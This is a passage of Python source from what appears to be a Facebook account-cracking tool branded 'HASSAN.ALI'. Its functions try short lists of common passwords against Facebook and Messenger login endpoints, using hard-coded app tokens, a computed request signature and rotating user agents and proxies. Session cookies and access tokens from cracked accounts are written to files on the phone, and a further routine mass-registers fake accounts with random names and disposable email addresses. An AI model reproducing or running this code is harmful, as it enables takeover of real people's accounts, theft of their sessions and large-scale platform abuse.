                    open('/sdcard/HASSAN.ALI-TOOL/RANDOM/HASSAN.ALI-M2-COOKIE.txt','a').write(uid+'|'+pas+' | '+ckkk+'\n')
                    open('/sdcard/HASSAN.ALI-TOOL/RANDOM/HASSAN.ALI-M2-OK.txt','a').write(uid+'|'+pas+'\n')
                    oks.append(ids)
                    break
            elif 'www.facebook.com' in q['error_msg']:
                print('\r\r\x1b[1;31m[HASSAN.ALI-CP] '+ids+' | '+pas+'\033[1;97m')
                open('/sdcard/HASSAN.ALI-TOOL/RANDOM/RMX-M2-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(5)
    except Exception as e:pass
#▬▭▬▭▬▭▬▭[RANDOM METHOD 3]▬▭▬▭▬▭▬▭#
def rmx3(ids,passlist):
    global loop,oks,cps,sim_id
    sys.stdout.write('\r\r\033[1;37m[M3] %s|\x1b[38;5;46mOK:-%s\033[1;37m|\x1b[1;31mCP:-%s \033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
    ses = requests.Session()
    while True:
        try:
            pro=random.choice(ugen)
            headers = {
            "Host": "www.messenger.com",
            "Connection": "keep-alive",
            "Content-Length": "267",
            "Cache-Control": "max-age=0",
            "sec-ch-ua": '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Linux"',
            "Upgrade-Insecure-Requests": "1",
            "Origin": "https://www.messenger.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": pro,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": "https://www.messenger.com/",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-GB,en;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5",
            }
            reqs = ses.get("https://www.messenger.com/").text
            datr = re.search('_js_datr","(.*?)",', str(reqs)).group(1)
            data = {
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(reqs)).group(1),
            "lsd":re.search('name="lsd" value="(.*?)"', str(reqs)).group(1),
            "initial_request_id":re.search('name="initial_request_id" value="(.*?)"', str(reqs)).group(1),
            "timezone":"-300",
            "lgndim":re.search('name="lgndim" value="(.*?)"', str(reqs)).group(1),
            "lgnrnd":re.search('name="lgnrnd" value="(.*?)"', str(reqs)).group(1),
            "lgnjs":"n",
            "email":ids,
            "login":"1",
            "default_persistent":""
            }
            headers.update({"Cookie":f"wd=980x1715; dpr=2; _js_datr={datr}"})
            break
        except Exception as e:pass
    for pas in passlist:
        try:
            data.update({"pass":"".join(pas)})
            response = ses.post("https://www.messenger.com/login/password/", data=data, headers=headers, proxies=prox(), allow_redirects=False)
            if "c_user" in ses.cookies.get_dict():
                coki = ses.cookies.get_dict()
                cok = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=en_US" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + base64.b64encode(os.urandom(30)).decode().replace("=","").replace("+","_").replace("/","-")) + ";" + ("m_page_voice="+coki["c_user"]) + ";ps_n=0;ps_l=0;m_pixel_ratio=2;wd=360x820;"
                uid = re.search('user=(.*?);',str(cok)).group(1)
                if uid in str(oks):
                    break
                print('\r\r\x1b[38;5;46m[HASSAN.ALI-OK] '+uid+' | '+pas+'\033[1;97m')
                open('/sdcard/HASSAN.ALI-TOOL/RANDOM/HASSAN.ALI-M3-COOKIE.txt','a').write(uid+'|'+pas+' | '+cok+'\n')
                open('/sdcard/HASSAN.ALI-TOOL/RANDOM/HASSAN.ALI-M3-OK.txt','a').write(uid+'|'+pas+'\n')
                oks.append(uid)
                break
            elif "www.facebook.com%2Fcheckpoint" in str(response.headers.get('Location')):
                try:
                    x = str(response.headers)
                    ids = re.findall("3A(.*?)%2",str(x))[1]
                except:
                    ids = ids
                print('\r\r\x1b[1;31m[HASSAN.ALI-CP] '+ids+' | '+pas+'\033[1;97m')
                open('/sdcard/RMX-TOOL/RANDOM/RMX-M3-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:continue
        except (requests.exceptions.ConnectionError):
            time.sleep(5)
        except Exception as e:pass
    loop+=1
#▬▭▬▭▬▭▬▭[RANDOM METHOD 4]▬▭▬▭▬▭▬▭#
def rmx4(ids,passlist):
    global loop,oks,cps,sim_id
    sys.stdout.write('\r\r\033[1;37m[M4] %s|\x1b[38;5;46mOK:-%s\033[1;37m|\x1b[1;31mCP:-%s \033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
    try:
        for pas in passlist:
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
            fbbv = str(random.randint(111111111,999999999))
            android_version = device['android_version']
            model = device['model']
            build = device['build']
            fblc = device['fblc']
            fbcr = sim_id
            fbmf = device['fbmf']
            fbbd = device['fbbd']
            fbdv = device['fbdv']
            fbsv = device['fbsv']
            fbca = device['fbca']
            fbdm = device['fbdm']
            fbfw = '1'
            fbrv = '0'
            fban = 'FB4A'
            fbpn = 'com.facebook.katana'
            data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_US','client_country_code': 'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
            headers=  {'User-Agent': warlee(), 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
            url = 'https://b-graph.facebook.com/auth/login'
            twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
            po = requests.post(url,data=data,headers=headers).json()
            if 'session_key' in po:
                try:
                    uid = po['uid']
                except:
                    uid = ids
                if str(uid) in oks:
                    break
                else:
                    coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                    print('\r\r\x1b[38;5;46m[HASSAN.ALI-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                    open('/sdcard/HASSAN.ALI-TOOL/RANDOM/HASSAN.ALI-M4-COOKIE.txt','a').write(str(uid)+'|'+pas+' | '+coki+'\n')
                    open('/sdcard/HASSAN.ALI-TOOL/RANDOM/HASSAN.ALI-M4-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in po['error']['message']:
                try:
                    uid = po['error']['error_data']['uid']
                except:
                    uid = ids
                if uid in oks:
                    pass
                else:
                    print('\r\r\x1b[1;31m[HASSAN.ALI-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                    open('/sdcard/RMX-TOOL/RANDOM/RMX-M3-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                    cps.append(str(ids))
                    break
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(5)        
    except Exception as e:pass
#▬▭▬▭▬▭▬▭[RANDOM METHOD 5]▬▭▬▭▬▭▬▭#
#▬▭▬▭▬▭▬▭[RANDOM METHOD 6]▬▭▬▭▬▭▬▭#
#▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭[OLD METHOD M1]▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭#
import hashlib
import base64

# خودکار سال معلوم کرنے کا فنکشن (UID Prefix کے مطابق)
def check_account_year(uid):
    uid_str = str(uid)
    if uid_str.startswith('100000'):
        return "2009"
    elif uid_str.startswith('100001') or uid_str.startswith('100002'):
        return "2010"
    elif uid_str.startswith('100003') or uid_str.startswith('100004'):
        return "2011"
    elif uid_str.startswith('100005') or uid_str.startswith('100006'):
        return "2012"
    elif uid_str.startswith('100007') or uid_str.startswith('100008'):
        return "2013"
    else:
        return "OLD"

def login_1(uid):
    global loop, oks, cps, sim_id
    # لائیو اسپیڈ اسٹیٹس کاؤنٹر
    sys.stdout.write(f'\r\r\033[1;37m[HASSAN-M1] {loop}|\x1b[38;5;46mOK:-{len(oks)}\033[1;37m|\x1b[1;31mCP:-{len(cps)} \033[1;37m')
    sys.stdout.flush()
    session = requests.session()
    
    try:
        # آپ کی کامن اولڈ پاس ورڈ لسٹ
        passlist = ('123456', '1234567', '12345678', '123456789', '11223344', 'aass1122', '123@@@')
        
        for pw in passlist:
            # ہر پاس ورڈ کی کوشش کے لیے نئے منفرد آئی ڈیز کی جنریشن
            adid = str(uuid.uuid4())
            device_id = str(uuid.uuid4())
            family_id = str(uuid.uuid4())
            advertiser_id = str(uuid.uuid4())
            
            data = {
                'adid': adid,
                'format': 'json',
                'device_id': device_id,
                'cpl': 'true',
                'family_device_id': family_id,
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '920925107441449|b2983aafb79c7b8817c559604f7adc44',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': advertiser_id,
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '920925107441449'
            }
            
            # فیس بک سیکیورٹی بائی پاس کے لیے لازمی سگنیچر (sig)
            secret = "b2983aafb79c7b8817c559604f7adc44"
            sig_data = "".join(f"{k}={v}" for k, v in sorted(data.items())) + secret
            data["sig"] = hashlib.md5(sig_data.encode("utf-8")).hexdigest()
            
            headers = {
                'User-Agent': W_ueragnt(),  # آپ کا اپنا یوزر ایجنٹ ہینڈلر
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'b-graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'authenticate',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'b2983aafb79c7b8817c559604f7adc44'
            }
            
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            
            # سیشن کیپچر اور کامیاب لاگ ان (OK)
            if 'session_key' in res:
                acc_year = check_account_year(uid)
                powerRMX = ";".join(i["name"]+"="+i["value"] for i in res["session_cookies"])
                RMXramxan = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                cookie = f"sb={RMXramxan};{powerRMX}"
                user_token = res.get('access_token', 'No Token')
                
                # ہائی پروفیشنل انگلش اوکے اسکرین پرنٹ
                print("\033[1;37m" + "-"*58)
                print(f"\x1b[38;5;46m[HASSAN-OK] \033[1;97m{uid} | {pw} \x1b[38;5;46m[{acc_year}]")
                print(f"\033[1;97m[🍪 COOKIE] : \x1b[38;5;46m{cookie}")
                print(f"\033[1;97m[🔑 TOKEN]  : \033[1;96m{user_token}")
                print("\033[1;37m" + "-"*58)
                
                open('/sdcard/HASSAN.ALI-TOOL/OLD/HASSAN.ALI-M1-COOKIE.txt', 'a').write(f"{uid}|{pw}|{acc_year}|{cookie}|{user_token}\n")
                open('/sdcard/HASSAN.ALI-TOOL/OLD/HASSAN.ALI-M1-OK.txt', 'a').write(f"{uid}|{pw}|{acc_year}\n")
                oks.append(uid)
                break
                
            # چیک پوائنٹ ہینڈلنگ (CP)
            elif 'error' in res and 'message' in res['error'] and 'www.facebook.com' in res['error']['message']:
                acc_year = check_account_year(uid)
                print(f'\r\r\x1b[1;31m[HASSAN-CP] {uid} | {pw} \033[1;97m[{acc_year}]')
                open('/sdcard/HASSAN.ALI-TOOL/OLD/RMX-M1-CP.txt', 'a').write(f"{uid}|{pw}|{acc_year}\n")
                cps.append(uid)
                break
                
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(5)
        login_1(uid)
    except Exception as e:
        pass
#▬▭▬▭▬▭▬▭[NEW ACCOUNT GENERATOR START]▬▭▬▭▬▭▬▭#
def create_new() -> None:
    clear()
    print('\033[1;97m[\x1b[38;5;46m1\033[1;97m] \033[1;97mAUTO PASSWORD')
    print('\033[1;97m[\x1b[38;5;46m2\033[1;97m] \033[1;97mCUSTOM PASSWORD');linex()
    rmxpassword=input(f'\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mCHOOSE : ')
    if rmxpassword in ['1','01']:passw = gen_password(12)
    elif rmxpassword in ['2','02']:passw = input(f'\033[1;97m[\x1b[38;5;46m•\033[1;97m] \033[1;97mENTER CUSTOMER PASSWORD : ')
    else:create_new()
    clear()
    print('\033[1;97m[\x1b[38;5;46m•\033[1;97m] \x1b[38;5;46mUSE FLIGHT MODE FOR SPEED UP')
    linex()
    global loop,oks,cps,uid,sim_id
    for make in range(1000):
        sys.stdout.write('\r\r\033[1;37m[HASSAN.ALI-CREATE] %s|\x1b[38;5;46mOK:-%s\033[1;37m|\x1b[1;31mCP:-%s \033[1;37m'%(make+1,len(oks),len(cps)));sys.stdout.flush()
        ses = requests.Session()
        try:
            response = ses.get(
                url='https://x.facebook.com/reg',
                params={"_rdc":"1","_rdr":"","wtsid":"rdr_0t3qOXoIHbMS6isLw","refsrc":"deprecated"},
                timeout=20
            )
        except Exception:
            continue
        try:
            mts = ses.get('https://x.facebook.com', timeout=20).text
            m_ts_match = re.search(r'name="m_ts" value="(.*?)"', str(mts))
            m_ts = m_ts_match.group(1) if m_ts_match else ""
        except Exception:
            m_ts = ""
        formula = extractor(response.text) if response and response.text else {}
        m=['William|Harris', 'Ethan|Clark', 'Alexander|Lewis', 'Daniel|Hall', 'Michael|Allen', 'Jackson|Young', 'Matthew|Wright', 'Joseph|Scott', 'Andrew|King', 'Sophia|Johnson', 'Olivia|Davis', 'Liam|Williams', 'Mia|Brown', 'Ava|Jones', 'Charlotte|Miller', 'Amelia|Rodriguez', 'Harper|Garcia', 'Evelyn|Martinez', 'Grace|Hernandez', 'Abigail|Lopez', 'Lily|Gonzalez', 'Layla|Wilson', 'Scarlett|Anderson', 'Emily|Thomas', 'Madison|Taylor', 'Elizabeth|Moore', 'Sofia|Jackson', 'Ella|Martin', 'Avery|Lee', 'Grace|White', 'Aria|Harris', 'Ella|Clark', 'Chloe|Lewis', 'Nora|Hall', 'Isabella|Allen', 'Hannah|Young', 'Elizabeth|Wright', 'Oliver|King', 'Lucas|Johnson', 'Henry|Davis', 'Benjamin|Williams', 'Samuel|Brown', 'Aiden|Jones', 'Matthew|Miller', 'Liam|Rodriguez', 'Daniel|Garcia', 'Ethan|Martinez', 'Michael|Hernandez', 'Alexander|Lopez', 'Jackson|Gonzalez', 'Joseph|Wilson', 'Andrew|Anderson', 'Sophia|Thomas', 'Olivia|Taylor', 'Mia|Moore', 'Liam|Jackson', 'Ava|Martin', 'Charlotte|Lee', 'Amelia|White', 'Harper|Harris', 'Evelyn|Clark', 'Grace|Lewis', 'Abigail|Hall', 'Lily|Allen', 'Scarlett|Young', 'Emily|Wright', 'Madison|Scott', 'Elizabeth|King', 'Sofia|Johnson', 'Olivia|Davis', 'Liam|Williams', 'Mia|Brown', 'Ava|Jones', 'Charlotte|Miller', 'Amelia|Rodriguez', 'Harper|Garcia', 'Evelyn|Martinez', 'Grace|Hernandez', 'Abigail|Lopez', 'Lily|Gonzalez', 'Layla|Wilson', 'Scarlett|Anderson', 'Emily|Thomas', 'Madison|Taylor', 'Elizabeth|Moore', 'Sofia|Jackson', 'Ella|Martin', 'Avery|Lee', 'Grace|White', 'Aria|Harris', 'Ella|Clark', 'Chloe|Lewis', 'Nora|Hall', 'Isabella|Allen', 'Hannah|Young', 'Elizabeth|Wright', 'Oliver|King', 'Lucas|Johnson', 'Henry|Davis', 'Benjamin|Williams', 'Samuel|Brown', 'Aiden|Jones', 'Matthew|Miller', 'Liam|Rodriguez', 'Daniel|Garcia', 'Ethan|Martinez', 'Michael|Hernandez', 'Alexander|Lopez', 'Jackson|Gonzalez', 'Joseph|Wilson', 'Andrew|Anderson', 'Sophia|Thomas', 'Olivia|Taylor', 'Mia|Moore', 'Liam|Jackson', 'Ava|Martin', 'Charlotte|Lee', 'Amelia|White', 'Harper|Harris', 'Evelyn|Clark', 'Grace|Lewis', 'Abigail|Hall', 'Lily|Allen', 'Scarlett|Young', 'Emily|Wright', 'Madison|Scott', 'Elizabeth|King', 'Sofia|Johnson', 'Olivia|Davis', 'Liam|Williams', 'Mia|Brown', 'Ava|Jones', 'Charlotte|Miller', 'Amelia|Rodriguez', 'Harper|Garcia', 'Evelyn|Martinez', 'Grace|Hernandez', 'Abigail|Lopez', 'Lily|Gonzalez', 'Layla|Wilson', 'Scarlett|Anderson', 'Emily|Thomas', 'Madison|Taylor', 'Elizabeth|Moore', 'Sofia|Jackson', 'Ella|Martin', 'Avery|Lee', 'Grace|White', 'Aria|Harris', 'Ella|Clark', 'Chloe|Lewis', 'Nora|Hall', 'Isabella|Allen', 'Hannah|Young', 'Elizabeth|Wright', 'Oliver|King', 'Lucas|Johnson', 'Henry|Davis', 'Benjamin|Williams', 'Samuel|Brown', 'Aiden|Jones', 'Matthew|Miller', 'Liam|Rodriguez', 'Daniel|Garcia', 'Ethan|Martinez', 'Michael|Hernandez', 'Alexander|Lopez', 'Jackson|Gonzalez', 'Joseph|Wilson', 'Andrew|Anderson', 'Sophia|Thomas', 'Olivia|Taylor', 'Mia|Moore', 'Liam|Jackson', 'Ava|Martin', 'Charlotte|Lee', 'Amelia|White', 'Harper|Harris', 'Evelyn|Clark', 'Grace|Lewis', 'Abigail|Hall', 'Lily|Allen', 'Scarlett|Young', 'Emily|Wright', 'Madison|Scott', 'Elizabeth|King','Felipe|Villanueva', 'Aurora|Bautista', 'Rodolfo|Diaz', 'Claro|Torres', 'Felicitas|Ocampo', 'Eduardo|Gomez', 'Rosalinda|Legaspi', 'Teresita|Carpio', 'Manuel|Chavez', 'Romeo|Enriquez', 'Elena|Sison', 'Anton|Balagtas', 'Cecilio|Cruz', 'Adriana|Ortiz', 'Erlinda|Aquino', 'Eufemia|Fernandez', 'Silvestre|Mercado', 'Gerry|Reyes', 'Apolinario|Ramirez', 'Tatiana|Perez', 'Zosimo|Santos', 'Araceli|Garcia', 'Luciana|Santiago', 'Eligio|Manalo', 'Ciriaco|Luna', 'Trinidad|Domingo', 'Inocencio|Pascual', 'Theresa|Vasquez', 'Amado|Magno', 'Conrado|Gutierrez', 'Lourdes|Lopez', 'Bibiana|Castro', 'Juanita|Lim', 'Lolita|Valdez', 'Eleanor|Flores', 'Filomena|Cordero', 'Josefa|Fernandez', 'Consolacion|Gonzales', 'Clarita|Torres', 'Geronimo|Serrano', 'Eugenia|Dela Cruz', 'Edmundo|Vergara', 'Bienvenido|Estrella', 'Eleuterio|Pineda', 'Teresita|Diaz', 'Amelia|Cruz', 'Concepcion|Gomez', 'Santiago|Reyes', 'Mariano|Manalo', 'Victoria|Soriano', 'Romeo|Perez', 'Renato|Aguilar', 'Leticia|Ong', 'Rogelio|Fernandez', 'Edna|Aquino', 'Eleanor|Garcia', 'Adoracion|Torres', 'Bartolome|Enriquez', 'Imelda|Domingo', 'Rufino|Hernandez', 'Manolito|Carpio', 'Virgilio|Ortiz', 'Sergio|Santos', 'Daisy|Vasquez', 'Nicanor|Gutierrez', 'Estrellita|Legaspi', 'Gerardo|Cruz', 'Reynaldo|Gomez', 'Carmencita|Dela Cruz', 'Edwin|Balagtas', 'Andres|Estrella', 'Perlita|Bautista', 'Esperanza|Serrano', 'Cristina|Ocampo', 'Wilfredo|Reyes', 'Epifania|Santiago', 'Crisanto|Garcia', 'Rowena|Aquino', 'Agustin|Magno', 'Salvador|Cordero', 'Ginalyn|Ramirez', 'Arman|Pascual', 'Meliton|Soriano', 'Nicanora|Perez', 'Cesario|Santos', 'Esmeralda|Castro', 'Juanito|Luna', 'Melissa|Mercado', 'Aldrin|Diaz', 'Gregorio|Gomez', 'Evelina|Reyes', 'Librada|Balagtas', 'Policarpio|Estrella', 'Cirila|Fernandez', 'Ramil|Carpio', 'Eladio|Serrano', 'Arlene|Dela Cruz', 'Ludivina|Gutierrez', 'Reynante|Villanueva', 'Domitila|Torres', 'Elmira|Enriquez', 'Arnulfo|Legaspi', 'Glorioso|Santiago', 'Nena|Pineda', 'Enrique|Bautista', 'Wilma|Valdez', 'Siony|Aquino', 'Susana|Santos', 'Restituto|Garcia', 'Emiliano|Magno', 'Luningning|Reyes', 'Beatriz|Cruz', 'Wilfredo|Aguilar', 'Vivian|Ortiz', 'Rosendo|Soriano', 'Mely|Fernandez', 'Carmel|Perez', 'Gresilda|Gomez', 'Froilan|Diaz', 'Rosie|Serrano', 'Wilhelmina|Domingo', 'Zacarias|Balagtas', 'Merle|Pascual', 'Zeny|Castro', 'Aniceto|Hernandez', 'Luningning|Carpio', 'Renaldo|Reyes', 'Siony|Santos', 'Edgar|Santiago', 'Thelma|Legaspi', 'Wilfredo|Pineda', 'Elenita|Vasquez', 'Fernando|Gutierrez', 'Merlita|Aquino', 'Aida|Bautista', 'Gladys|Valdez', 'Luningning|Ortiz', 'Myrna|Cruz', 'Esmeraldo|Magno', 'Evangelina|Estrella', 'Maricris|Garcia', 'Luningning|Diaz', 'Jonas|Fernandez', 'Salvacion|Serrano', 'Apolinar|Luna', 'Alipio|Reyes', 'Priscilla|Aquino', 'Chona|Perez', 'Joselito|Santos', 'Clint|Gomez', 'Candice|Dela Cruz', 'Nicanora|Gutierrez', 'Gaudencio|Villanueva', 'Rodrigo|Torres', 'Alona|Enriquez', 'Bartolome|Legaspi', 'Rizalina|Santiago', 'Erlindo|Pineda', 'Alberto|Bautista', 'Carolina|Valdez', 'Marivic|Aquino', 'Ramona|Santos', 'Glicerio|Garcia', 'Rey|Magno', 'Gina|Reyes', 'Mercedita|Cruz', 'Evelio|Aguilar', 'Aileen|Ortiz', 'Luningning|Soriano', 'Renato|Fernandez', 'Carina|Perez', 'Lito|Gomez', 'Felipe|Diaz', 'Siony|Serrano', 'Erlina|Domingo', 'Anecito|Balagtas', 'Cristina|Pascual', 'Chito|Castro', 'Charito|Hernandez', 'Maritess|Carpio', 'Amelita|Reyes', 'Felicitas|Santos', 'Evangeline|Dela Cruz','Isabella|Smith','Jack|Williams','Olivia|Jones','William|Brown','Charlotte|Wilson','James|Taylor','Emily|Davis','Thomas|Evans','Amelia|Martin','Benjamin|Harris','Ella|Thompson','Liam|Anderson','Chloe|White','Samuel|Hall','Grace|Johnson','Lucas|Moore','Sophie|Clark','Jacob|Lewis','Ava|Walker','Matthew|Roberts','Mia|Harrison','Lachlan|Scott','Zoe|Adams','Alexander|Mitchell','Sophia|Nelson','Joshua|Thomas','Ruby|Hill','Ethan|Baker','Lily|Green','Charlie|King','Grace|Wright','Daniel|Anderson','Ella|Wilson','Henry|Young','Scarlett|Harris','Leo|Miller','Oliver|Evans','Lily|Smith','William|Thompson','Emily|Clark','Lucas|Davis','Charlotte|Moore','James|Williams','Sophie|White','Benjamin|Brown','Amelia|Wilson','Zoe|Roberts','Ella|Thomas','Henry|King','Mia|Taylor','Charlie|Nelson','Ava|Scott','Liam|Adams','Samuel|Mitchell','Zoe|Young','Grace|Lewis','Ethan|Hall','Oliver|Smith','Ruby|Harris','Jacob|Clark','Sophia|Wilson','Isabella|Jones','Lachlan|Anderson','Thomas|Brown','Amelia|Smith','Lucas|Taylor','Ava|Thompson','Charlotte|Mitchell','James|Wilson','Jack|Davis','Olivia|Smith','Emily|Thomas','William|Martin','Ella|Clark','Henry|Williams','Sophie|Young','Liam|Evans','Chloe|Moore','Zoe|Anderson','Mia|Adams','Benjamin|Harris','Leo|Wilson','Grace|Lewis','Joshua|King','Scarlett|Taylor','Ethan|Scott','Amelia|Mitchell','Lily|Hall','Thomas|Smith','Samuel|Clark','Ava|Brown','Jacob|Williams','Grace|Taylor','Zoe|Young','Ella|Moore','Oliver|Thompson','Emily|Martin','William|Harris','Liam|Wilson','Chloe|Smith','Lucas|Mitchell','Sophia|Evans','Henry|Davis','James|Young','Ruby|Anderson','Benjamin|Williams','Jacob|King','Olivia|Taylor','Leo|Smith','Ava|Martin','Jack|Scott','Mia|Thompson','Scarlett|Mitchell','Isabella|Davis','Ella|Wilson','Lachlan|Brown','James|Roberts','Emily|Harris','Amelia|Moore','William|Jones','Grace|Nelson','Sophie|Adams','Thomas|Anderson','Zoe|Wilson','Charlotte|Hall','Henry|Evans','Liam|Martin','Oliver|Smith','Jacob|Davis','Ruby|Young','Jack|Thompson','Ella|Moore','Olivia|Smith','Benjamin|King','Ava|Wilson','Emily|Taylor','Scarlett|Mitchell','Chloe|Brown','Lachlan|Roberts','Leo|Harris','James|Mitchell','Sophia|Smith','Isabella|Jones','Zoe|Hall','Jacob|Young','William|Davis','Oliver|Adams','Mia|Wilson','Emily|Clark','Ella|Anderson','Lucas|King','Ava|Harris','Charlotte|Smith','Grace|Taylor','Liam|Evans','Benjamin|Mitchell','Henry|Roberts','Sophie|Nelson','James|Wilson','Olivia|Brown','Ruby|Jones','Ethan|Hall','Isabella|Young','Amelia|Davis','Zoe|Thompson','Lachlan|Smith','Emily|Wilson','Henry|Mitchell','Oliver|Harris','Jacob|Smith','Chloe|Young','James|Hall','Liam|Mitchell','Ava|Roberts','Jack|Adams','Sophie|Brown','Scarlett|Davis','Grace|King','Ruby|Wilson','William|Harris','Mia|Smith','Leo|Thompson','Olivia|Evans','Lucas|Martin','Ella|Hall','Sophia|Moore','Benjamin|Mitchell','James|Nelson','Lachlan|Smith','Henry|Jones','Amelia|Harris','Isabella|Davis','Emily|Thompson','Ava|Smith','Oliver|Young','Jacob|Roberts','Zoe|Wilson','Sophie|Clark','Ruby|Moore','Chloe|Mitchell','Jack|Nelson','Grace|Adams','Liam|Brown','Ella|Smith','James|Evans','William|King','Olivia|Davis','Leo|Hall','Sophia|Mitchell','Henry|Wilson','Scarlett|Thompson','Mia|Harris','Oliver|Smith','Jacob|Young','Ava|Moore','Emily|Roberts','James|Nelson','Isabella|Smith','Liam|Clark','Sophie|Wilson','Ruby|Davis','Benjamin|Young','Olivia|Harris','Ella|King','Jack|Smith','Lucas|Thompson','Chloe|Moore','Jacob|Mitchell','Scarlett|Wilson','Mia|Nelson','Henry|Roberts','Sophia|Hall','Oliver|Smith','Ella|Young','James|Harris','Emily|King','William|Davis','Isabella|Mitchell','Ava|Evans','Jacob|Thompson','Liam|Wilson','Ruby|Smith','Sophie|Moore','Olivia|Nelson','Oliver|Young','Chloe|Roberts','Jack|Hall','Scarlett|Smith','James|Young','Ella|Davis','Jacob|Wilson','Mia|Harris','Henry|Thompson','Ava|Moore','Lucas|Mitchell']
        firstname = random.choice(m).split("|")[0]
        lastname = random.choice(m).split("|")[1]
        domainn = random.choice(['linshiyouxiang.net','mailsbay.com','besttempmail.com'])
        email2 = f"{firstname.lower()}{lastname.lower()}{random.randint(10,99)}@{domainn}"
        payload = {
            'ccp': "2",
            'reg_instance': str(formula["reg_instance"]),
            'submission_request': "true",
            'helper': "",
            'reg_impression_id': str(formula["reg_impression_id"]),
            'ns': "1",
            'zero_header_af_client': "",
            'app_id': "103",
            'logger_id': str(formula["logger_id"]),
            'field_names[0]': "firstname",
            'firstname': firstname,
            'lastname': lastname,
            'field_names[1]': "birthday_wrapper",
            'birthday_day': str(random.randint(1,28)),
            'birthday_month': str(random.randint(1,12)),
            'birthday_year': str(random.randint(1992,2009)),
            'age_step_input': "",
            'did_use_age': "false",
            'field_names[2]': "reg_email__",
            'reg_email__': email2,
            'field_names[3]': "sex",
            'sex': "2",
            'preferred_pronoun': "",
            'custom_gender': "",
            'field_names[4]': "reg_passwd__",
            'name_suggest_elig': "false",
            'was_shown_name_suggestions': "false",
            'did_use_suggested_name': "false",
            'use_custom_gender': "false",
            'guid': "",
            'pre_form_step': "",
            'encpass': '#PWD_BROWSER:0:{}:{}'.format(str(time.time()).split('.')[0],passw),
            'submit': "Sign Up",
            'fb_dtsg': "NAcMC2x5X2VrJ7jhipS0eIpYv1zLRrDsb5y2wzau2bw3ipw88fbS_9A:0:0",
            'jazoest': str(formula["jazoest"]),
            'lsd': str(formula["lsd"]),
